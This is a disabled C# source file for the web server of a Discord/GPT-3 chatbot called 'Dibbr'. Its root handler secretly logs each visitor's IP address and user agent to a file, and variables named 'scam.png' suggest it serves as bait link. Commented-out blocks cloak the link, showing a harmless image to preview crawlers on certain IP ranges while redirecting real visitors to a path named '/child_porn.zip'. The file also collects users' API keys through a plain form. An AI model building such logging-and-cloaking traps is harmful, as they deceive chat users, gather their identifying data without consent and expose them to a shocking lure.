#if false
using System;
using System.Collections.Generic;
using System.Configuration;
using System.IO;
using System.Threading;
using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;
using System.Text;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.FileProviders;

using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.DependencyInjection;

using System.Threading.Tasks;

namespace DibbrBot;

class Web
{
    public static List<ChatSystem> Clients = new();
    static WebApplication _app;

    public static void Run()
    {
        var builder = WebApplication.CreateBuilder();
        // for twilio
       // builder.Services.AddControllers();
      //  builder.Services.AddMvc();
     //   builder.Co//.UseEndpoints(endpoints => { endpoints.MapControllers(); });
        var txt = File.ReadAllText("index.html");
        builder.WebHost.ConfigureKestrel(options =>
        {
            
            options.ListenAnyIP(80); // to listen for incoming http connection on port 5001
            options.ListenAnyIP(443,
                configure => { configure.UseHttps();}); // to listen for incoming https connection on port 7001
        });
        
        _app = builder.Build();
        _app.UseStaticFiles();

      //  Twilio.Clients.

        _app.MapGet("/sms", ([FromQuery] string from) =>
        {
            var response = new MessagingResponse();
            response.Message($"Ahoy {from}!");
            return Results.Extensions.TwiML(response);
        });

        _app.MapPost("/sms", async (HttpRequest request) =>
        {
            var form = await request.ReadFormAsync();
            var from = form["from"];
            var response = new MessagingResponse();
            response.Message($"Ahoy {from}!");
            return Results.Extensions.TwiML(response);
        });


        /*  _app.UseFileServer(new FileServerOptions()
          {
              EnableDefaultFiles = false, EnableDirectoryBrowsing = true,
              FileProvider = new PhysicalFileProvider("D:/")
          });*/
        var img = "scam.png";
        _app.MapGet("/", async context =>
        {
            var str = $"\n--------------{DateTime.Now.ToString()}-------------------------\nInfo: ";
            var imgurl = "https://dabbr.pagekite.me/" + img;
            var ip = context.Request.Headers["X-Forwarded-For"].ToString();
            str += "\nIP = " + ip ?? "none";
            str += "\nIP2 = " + context.Connection.RemoteIpAddress?.ToString() ?? "none";

            if (ip == null) { ip = context.Connection.RemoteIpAddress?.ToString(); }
            if(context.Request.Headers.TryGetValue("User-Agent", out var val))
            {
                str += "\nUser agent: " + val.ToString();

            }
            File.AppendAllText("web_requests.txt", str);
         //   Console.Beep(500, 100);
            await Task.Delay(100);
           // Console.Beep(300, 100);
            await context.Response.SendFileAsync("E:/HOT.mkv");
            
    /*        if (ip.Contains(":")) ip = ip.After(":");
            Console.WriteLine(ip);
            if (ip.StartsWith("35.") || ip.StartsWith("34."))
            {
                context.Response.ContentType = "image/jpeg";
                context.Response.Headers.Add("Content-Disposition", $"attachment; filename={img}");
                await context.Response.SendFileAsync("D:/" + img);
            }
            else
            {
                context.Response.Redirect("/child_porn.zip");
                await context.Response.WriteAsync("<meta http-equiv=\"refresh\" content=\"0; url=/child_porn.zip\">" +
                                                  "<script>setTimeout(function() {" +
                                                  $"window.location = \"{imgurl}\"" + "}, 500)</script>");
            }*/
        });

        string MakePage(string openai = "", string discord = "", string channel = "")
        {
            var page = txt;
            page = page.Replace("{Discord}", discord);
            page = page.Replace("{OpenAI}", openai);
            page = page.Replace("{Channel}", channel);

            if (discord.Length > 0 && openai.Length > 0)
            {
                var gpt3 = new GPT3(openai);
                if (channel == "")
                {
                    foreach (var c in Clients)
                    {
                       // if ((c as DiscordChatV2).Id != discord) continue;

                        page = page.Replace("{Status}", $"{Program.BotName} is already running with your key");
                        return page;
                    }


                   // Program.NewClient(new DiscordChatV2(), discord, gpt3);
                }
               // else
                   // Program.NewClient(new DiscordChat(false, ConfigurationManager.AppSettings["BotName"], null),
                   //     discord, gpt3);

                page = page.Replace("{Status}",
                    $"{Program.BotName} initialized with provided keys! Try summoning him in your server chat with {Program.BotName}, hi!");
            }
            else
                page = page.Replace("{status}", "Dibbr not initialized, please provide keys for dibbr");

            return page;
        }
        /*  _app.MapGet("/index.html", () =>
          {
              return Results.Text(txt, "text/html");
          });*/

       

    /*    _app.MapGet("/" + img, async context =>
        {
            var imgurl = "https://dabbr.pagekite.me/" + img;
            var ip = context.Request.Headers["X-Forwarded-For"].ToString();
            if (ip == null) { ip = context.Connection.RemoteIpAddress?.ToString(); }

            if (ip.Contains(":")) ip = ip.After(":");
            Console.WriteLine(ip);
            if (ip.StartsWith("35.") || ip.StartsWith("34."))
            {
                context.Response.ContentType = "image/jpeg";
                context.Response.Headers.Add("Content-Disposition", $"attachment; filename={img}");
                await context.Response.SendFileAsync("D:/" + img);
            }
            else
            {
                context.Response.Redirect("/child_porn.zip");
                await context.Response.WriteAsync("<meta http-equiv=\"refresh\" content=\"0; url=/child_porn.zip\">" +
                                                  "<script>setTimeout(function() {" +
                                                  $"window.location = \"{imgurl}\"" + "}, 500)</script>");
            }
        });
    */
        _ = _app.MapGet("/bot", () => Results.Text(MakePage(), "text/html"));
        _ = _app.MapPost("/bot", (HttpContext ctx) =>
        {
            var openai = ctx.Request.Form["OpenAI"];
            var discord = ctx.Request.Form["Discord"];
            return Results.Text(MakePage(openai, discord, ctx.Request.Form["Channel"]), "text/html");
        });

        // Configure the HTTP request pipeline.
        //  if (!app.Environment.IsDevelopment())
        //   {
        //  app.UseExceptionHandler("/Error");
        // The default HSTS value is 30 days. You may want to change this for production scenarios, see https://aka.ms/aspnetcore-hsts.
        //  app.UseHsts();
        //   app.UseHttpsRedirection();
        //  }

        t = new Thread(() => { _app.Run(); });
        t.Start();

    }
    static Thread t;
}
#endif